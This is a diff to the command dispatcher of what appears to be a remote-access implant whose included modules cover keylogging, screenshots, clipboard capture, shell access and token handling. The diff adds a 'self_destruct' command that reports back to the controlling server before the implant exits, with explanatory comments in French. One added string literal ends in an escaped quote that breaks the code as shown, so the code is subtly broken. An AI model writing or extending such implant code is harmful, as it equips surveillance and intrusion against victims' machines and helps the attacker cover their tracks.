@@ -13,6 +13,7 @@
 #include "handlers/recon.h"
 #include "handlers/shell.h"
 #include "handlers/token.h"
+#include "handlers/destruct.h"
 #include "../../include/surveillance/screenshot.h"
 #include "../../include/surveillance/keylogger.h"
 #include "../../include/surveillance/clipboard.h"
@@ -208,6 +209,8 @@ static command_type_t string_to_command(const char *cmd) {
     return CMD_SCAN_RANGE;
   if (str_icmp(cmd, "scan_host") == 0)
     return CMD_SCAN_HOST;
+  if (str_icmp(cmd, "self_destruct") == 0)
+    return CMD_SELF_DESTRUCT;
 
   return CMD_NONE;
 }
@@ -894,6 +897,23 @@ int dispatcher_execute(task_t *task, task_result_t *result) {
         status = STATUS_FAILURE;
       }
       result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+  case CMD_SELF_DESTRUCT:
+    {
+      // Informe le serveur avant de mourir
+      result->output = str_dup("Self-destruct initiated. Goodbye.\");
+      result->output_len = result->output ? strlen(result->output) : 0;
+      result->status = STATUS_SUCCESS;
+      
+      // Note: handle_self_destruct() appelle ExitProcess(), donc 
+      // cette fonction ne retourne jamais. On doit d'abord envoyer
+      // le résultat au serveur avant d'appeler self_destruct.
+      // Le demon devra appeler handle_self_destruct() après avoir
+      // envoyé ce résultat.
+      g_demon.self_destruct_pending = TRUE;
+      status = STATUS_SUCCESS;
     }
     break;
 
